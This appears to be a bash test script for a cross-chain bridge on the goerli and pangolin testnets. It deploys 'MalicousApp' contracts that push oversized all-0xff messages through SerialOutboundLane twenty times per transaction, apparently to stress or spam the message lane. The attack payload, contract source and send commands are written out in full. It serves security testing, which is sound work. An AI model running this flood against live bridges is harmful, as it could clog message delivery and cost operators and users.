#!/usr/bin/env bash

set -e

unset SOURCE_CHAIN
unset TARGET_CHAIN
unset ETH_RPC_URL
unset SETH_CHAIN
export SOURCE_CHAIN=goerli
export TARGET_CHAIN=pangolin
export MODE=test

. $(dirname $0)/base.sh

bytecode=608060405234801561001057600080fd5b5061056f806100206000396000f3fe6080604052600436106100345760003560e01c8063142c2a6a1461003957806337267fd91461005b578063914a2fc714610095575b600080fd5b34801561004557600080fd5b5061005961005436600461029a565b6100a8565b005b34801561006757600080fd5b50610081610076366004610314565b600195945050505050565b604051901515815260200160405180910390f35b6100596100a33660046103b6565b6100bd565b60005b806100b581610404565b9150506100ab565b6040516000906100f3907f142c2a6a000000000000000000000000000000000000000000000000000000009084906020016104c7565b604080517fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0818403018152908290527f303d8a12000000000000000000000000000000000000000000000000000000008252915073ffffffffffffffffffffffffffffffffffffffff84169063303d8a129034906101779030908690600401610502565b60206040518083038185885af1158015610195573d6000803e3d6000fd5b50505050506040513d601f19601f820116820180604052508101906101ba9190610531565b50505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600082601f83011261020057600080fd5b813567ffffffffffffffff8082111561021b5761021b6101c0565b604051601f83017fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0908116603f01168101908282118183101715610261576102616101c0565b8160405283815286602085880101111561027a57600080fd5b836020870160208301376000602085830101528094505050505092915050565b6000602082840312156102ac57600080fd5b813567ffffffffffffffff8111156102c357600080fd5b6102cf848285016101ef565b949350505050565b803563ffffffff811681146102eb57600080fd5b919050565b803573ffffffffffffffffffffffffffffffffffffffff811681146102eb57600080fd5b60008060008060006080868803121561032c57600080fd5b610335866102d7565b9450610343602087016102d7565b9350610351604087016102f0565b9250606086013567ffffffffffffffff8082111561036e57600080fd5b818801915088601f83011261038257600080fd5b81358181111561039157600080fd5b8960208285010111156103a357600080fd5b9699959850939650602001949392505050565b600080604083850312156103c957600080fd5b6103d2836102f0565b9150602083013567ffffffffffffffff8111156103ee57600080fd5b6103fa858286016101ef565b9150509250929050565b60007fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361045c577f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b5060010190565b6000815180845260005b818110156104895760208185018101518683018201520161046d565b5060006020828601015260207fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0601f83011685010191505092915050565b7fffffffff00000000000000000000000000000000000000000000000000000000831681526040602082015260006102cf6040830184610463565b73ffffffffffffffffffffffffffffffffffffffff831681526040602082015260006102cf6040830184610463565b60006020828403121561054357600080fd5b815167ffffffffffffffff8116811461055b57600080fd5b939250505056fea164736f6c6343000811000a

large="hex'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'";

# SOURCE_MALICOUSAPP=$(seth send --create $bytecode --chain $SOURCE_CHAIN)
SOURCE_MALICOUSAPP=0x09033682A48E27D0C54eC742f852B20deeCE6E59
# TARGET_MALICOUSAPP=$(seth send --create $bytecode --chain $TARGET_CHAIN)
TARGET_MALICOUSAPP=0x6d22097fFCb7c20a20cf9c4136b1c6Bd08c7d978

SOURCE_SERIALOUTBOUNDLANE=$(seth --to-checksum-address $(load_saddr "SerialOutboundLane"))
TARGET_SERIALOUTBOUNDLANE=$(seth --to-checksum-address $(load_taddr "SerialOutboundLane"))

source_bc=$(cat <<.
pragma solidity 0.8.17;

interface III {
   function malicious(address outlane, bytes memory large) external payable;
}

contract MalicousApp {
   bytes constant large = $large;
   function malicious(uint fee) public payable {
       for (uint i=0; i<20; i++) {
        III($SOURCE_MALICOUSAPP).malicious{value: fee}($SOURCE_SERIALOUTBOUNDLANE, large);
       }
   }
}
.
)

echo "$source_bc" | solc - --bin
sm=0x2687d322241c62ccf72ff573bd6a355b6a121a99

target_bc=$(cat <<.
pragma solidity 0.8.17;

interface III {
   function malicious(address outlane, bytes memory large) external payable;
}

contract MalicousApp {
   bytes constant large = $large;
   function malicious(uint fee) public payable {
       for (uint i=0; i<20; i++) {
        III($TARGET_MALICOUSAPP).malicious{value: fee}($TARGET_SERIALOUTBOUNDLANE, large);
       }
   }
}
.
)

echo "$target_bc" | solc - --bin
tm=0xe1d9f4b7038d9ced11c552c4ccf1225b0f7e0dfa

SOURCE_FEEMARKET=$(load_saddr "FeeMarketProxy")
TARGET_FEEMARKET=$(load_taddr "FeeMarketProxy")

source_fee=$(seth call $SOURCE_FEEMARKET "market_fee()(uint)" --chain $SOURCE_CHAIN)
target_fee=$(seth call $TARGET_FEEMARKET "market_fee()(uint)" --chain $TARGET_CHAIN)

sf=$(echo "$source_fee*20" | bc)
tf=$(echo "$target_fee*20" | bc)

seth send -V $sf $sm "malicious(uint)" $source_fee --chain $SOURCE_CHAIN
seth send -V $tf $tm "malicious(uint)" $target_fee --chain $TARGET_CHAIN
